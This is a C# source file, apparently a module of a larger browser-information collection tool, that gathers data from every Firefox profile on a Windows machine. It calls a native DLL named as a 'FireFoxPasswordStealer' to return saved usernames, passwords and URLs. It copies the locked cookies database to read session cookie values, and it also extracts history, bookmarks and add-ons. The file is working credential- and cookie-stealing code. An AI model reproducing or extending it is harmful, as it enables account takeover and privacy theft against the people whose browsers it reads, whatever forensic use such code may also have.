using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SQLite;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace Module_Browser_Info.Firefox
{
    /// <summary>
    /// get infromation from firefox
    /// </summary>
    public class Firefox
    {
        /// <summary>
        /// Gets the firefox password from DLL.
        /// </summary>
        /// <returns>return string from _s_Module_Browser_Info_FireFoxPasswordStealer.dll contain user pass saved on firefox</returns>
        [DllImport("_s_Module_Browser_Info_FireFoxPasswordStealer.dll", CallingConvention = CallingConvention.Cdecl)]
        [return: MarshalAs(UnmanagedType.BStr)]
        /// <summary>
        /// Gets the firefox password.
        /// </summary>
        /// <returns>call GetFirefoxPasswordFromDLL from _s_Module_Browser_Info_FireFoxPasswordStealer and return string data</returns>
        static extern string GetFirefoxPasswordFromDLL();
        public static string OnGetFirefoxPassword()
        {
            string Usernames_Passwords_Urls = GetFirefoxPasswordFromDLL();
            return Usernames_Passwords_Urls;
        }
        /// <summary>
        /// Gets the firefox addon list.
        /// </summary>
        /// <returns>get string list of firefox addons</returns>
        public static List<string> OnGetFirefoxAddonList()
        {
            List<string> AdodonsList = new List<string>();
            List<string> Profiles = GetFirefoxProfilePaths();
            foreach (string profile in Profiles)
            {
                string strPath = profile + "\\addons.json";
                using (StreamReader file = File.OpenText(strPath))
                    {
                       JsonSerializer serializer = new JsonSerializer();
                       JToken addonsFile =(JToken) serializer.Deserialize(file, typeof(JToken));
                    JToken addons= addonsFile["addons"];
                    foreach (JToken addon in addons)
                    {
                        string addonname = addon["name"].ToString();
                        AdodonsList.Add(addonname);
                    }
                }
            }
            return AdodonsList;
        }
        /// <summary>
        /// Gets the firefox cookies.
        /// </summary>
        /// <returns>get the list of firefox cookies</returns>
        public static List<BrowserCookie_Node> OnGetFirefoxCookies()
        {
            List<string> Profiles = GetFirefoxProfilePaths();
            List<BrowserCookie_Node> Cookies = new List<BrowserCookie_Node>();
            foreach (string profile in Profiles)
            {
                string strPath, strTemp, strDb;
                strTemp = string.Empty;

                // Check to see if FireFox Installed
                strPath = profile+ "\\cookies.sqlite";
                if (string.Empty == strPath) // Nope, perhaps another browser
                    return Cookies;
                    // First copy the cookie jar so that we can read the cookies 
                    // from unlocked copy while
                    // FireFox is running
                    strTemp = strPath + ".temp";
                    strDb = "Data Source=" + strTemp + ";pooling=false";

                    File.Copy(strPath, strTemp, true);

                    // Now open the temporary cookie jar and extract Value from the cookie if
                    // we find it.
                    using (SQLiteConnection conn = new SQLiteConnection(strDb))
                    {
                        using (SQLiteCommand cmd = conn.CreateCommand())
                        {
                            cmd.CommandText = "SELECT * FROM moz_cookies";

                            conn.Open();
                            using (SQLiteDataReader sqlite_datareader = cmd.ExecuteReader())
                            {
                                while (sqlite_datareader.Read())
                                {
                                BrowserCookie_Node cookienode = new BrowserCookie_Node();
                                cookienode.baseDomain= sqlite_datareader["baseDomain"].ToString();
                                cookienode.name= sqlite_datareader["name"].ToString();
                                cookienode.value= sqlite_datareader["value"].ToString();
                                cookienode.expiry= BrowserHistory_Node.FromUnixTime(long.Parse(sqlite_datareader["expiry"].ToString()));
                                cookienode.creationTime = BrowserHistory_Node.FromUnixTime(long.Parse(sqlite_datareader["creationTime"].ToString()));
                                cookienode.lastAccessed = BrowserHistory_Node.FromUnixTime(long.Parse(sqlite_datareader["lastAccessed"].ToString()));
                                Cookies.Add(cookienode);
                                }
                            }
                            conn.Close();
                        }
                    }

                // All done clean up
                if (string.Empty != strTemp)
                {
                    File.Delete(strTemp);
                }
            }
            return Cookies;
        }
        /// <summary>
        /// Gets the firefox bookmarks.
        /// </summary>
        /// <returns>get the list of firefox bookmark</returns>
        public static List<BrowserHistory_Node> OnGetFirefoxBookmarks()
        {
            List<BrowserHistory_Node> URLs = new List<BrowserHistory_Node>();
            List<string> Profiles = GetFirefoxProfilePaths();

            foreach (string profile in Profiles)
            {
                SQLiteConnection sqlite_connection = new SQLiteConnection("Data Source=" + profile+ "\\places.sqlite" +  ";Version=3;");

                SQLiteCommand sqlite_command = sqlite_connection.CreateCommand();

                sqlite_connection.Open();

                sqlite_command.CommandText = "SELECT moz_bookmarks.id,moz_bookmarks.dateAdded,moz_bookmarks.lastModified ,moz_bookmarks.title,moz_places.url FROM moz_bookmarks LEFT JOIN moz_places WHERE moz_bookmarks.fk = moz_places.id AND moz_bookmarks.title != 'null'";

                SQLiteDataReader sqlite_datareader = sqlite_command.ExecuteReader();

                while (sqlite_datareader.Read())
                {
                    BrowserHistory_Node bookmarknode = new BrowserHistory_Node();
                    DateTime dateAdded = BrowserHistory_Node.FromUnixTime(long.Parse(sqlite_datareader["dateAdded"].ToString()));
                    DateTime lastModified = BrowserHistory_Node.FromUnixTime(long.Parse(sqlite_datareader["lastModified"].ToString()));
                    string title= sqlite_datareader["title"].ToString();
                    string url= sqlite_datareader["Url"].ToString();
                    bookmarknode.create = dateAdded;
                    bookmarknode.lastvisit = lastModified;
                    bookmarknode.title = title;
                    bookmarknode.url = url;
                    URLs.Add(bookmarknode);
                }
                sqlite_connection.Close();
            }
            return URLs;
        }
        /// <summary>
        /// Gets the firefox history.
        /// </summary>
        /// <returns>get list of firefox histroy</returns>
        public static List<BrowserHistory_Node> OnGetFirefoxHistory()
        {
            List<BrowserHistory_Node>  URLs = new List<BrowserHistory_Node>();
            List<string> Profiles= GetFirefoxProfilePaths();
            
            foreach(string profile in Profiles)
            {
                DataTable historyDT = ExtractFromTable("moz_places", profile);

                // Get visit Time/Data info
                DataTable visitsDT = ExtractFromTable("moz_historyvisits",
                                                       profile);
                int i = 0;
                // Loop each history entry
                foreach (DataRow row in historyDT.Rows)
                {
                    i++;
                    string ss = row["id"].ToString();

                    BrowserHistory_Node historynode = new BrowserHistory_Node();

                    DataRow[] DTRow= visitsDT.Select("place_id=" + row["id"].ToString());
                    // Select entry Date from visits
                    //var entryDate = (from dates in visitsDT.AsEnumerable()
                    //                 where dates["place_id"].ToString() == row["id"].ToString()
                    //                 select dates).LastOrDefault();

                    if (DTRow.Length >0)
                    {
                        DateTime dt = BrowserHistory_Node.FromUnixTime(long.Parse(DTRow[0].ItemArray[3].ToString()));
                        historynode.create = dt;
                    }
                    string last_visit_date = row["last_visit_date"].ToString();
                    if (last_visit_date != "")
                    {
                        historynode.lastvisit = BrowserHistory_Node.FromUnixTime(long.Parse(row["last_visit_date"].ToString()));
                    }

                    // Obtain URL and Title strings


                    historynode.url = row["Url"].ToString();
                    historynode.title = row["title"].ToString();
                    // Create new Entry


                    // Add entry to list
                    URLs.Add(historynode);
                }
  

            }
            return URLs;
        }

        /// <summary>
        /// Extracts from table.
        /// </summary>
        /// <param name="table">The table.</param>
        /// <param name="folder">The folder.</param>
        /// <returns>because of multi user firefox write this and extract datetable of any user</returns>
        private static DataTable ExtractFromTable(string table, string folder)
        {
            SQLiteConnection sql_con;
            SQLiteCommand sql_cmd;
            SQLiteDataAdapter DB;
            DataTable DT = new DataTable();

            // FireFox database file
            string dbPath = folder + "\\places.sqlite";

            // If file exists
            if (File.Exists(dbPath))
            {
                // Data connection
                sql_con = new SQLiteConnection("Data Source=" + dbPath +
                                    ";Version=3;New=False;Compress=True;");

                // Open the Connection
                sql_con.Open();
                sql_cmd = sql_con.CreateCommand();

                // Select Query
                string CommandText = "select * from " + table;

                // Populate Data Table
                DB = new SQLiteDataAdapter(CommandText, sql_con);
                DB.Fill(DT);

                // Clean up
                sql_con.Close();
            }
            return DT;
        }
        /// <summary>
        /// Gets the firefox profile paths.
        /// </summary>
        /// <returns>return profile path on system drive and local application path</returns>
        private static List<string> GetFirefoxProfilePaths()
        {
            List<string> Profiles = new List<string>();
            string apppath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            string mozilla = System.IO.Path.Combine(apppath, "Mozilla");

            bool exist = System.IO.Directory.Exists(mozilla);

            if (exist)
            {

                string firefox = System.IO.Path.Combine(mozilla, "firefox");

                if (System.IO.Directory.Exists(firefox))
                {
                    string prof_file = System.IO.Path.Combine(firefox, "profiles.ini");

                    bool file_exist = System.IO.File.Exists(prof_file);

                    if (file_exist)
                    {
                        StreamReader rdr = new StreamReader(prof_file);

                        string resp = rdr.ReadToEnd();

                        string[] lines = resp.Split(new string[] { "\r\n" }, StringSplitOptions.None);
                        foreach(string line in lines)
                        {
                            if(line.Contains("Path="))
                            {
                                string location = line.Split(new string[] { "=" }, StringSplitOptions.None)[1];
                                Profiles.Add(System.IO.Path.Combine(firefox, location));
                            }
                        }
                    }
                }
            }
            return Profiles;
        }
    }
}
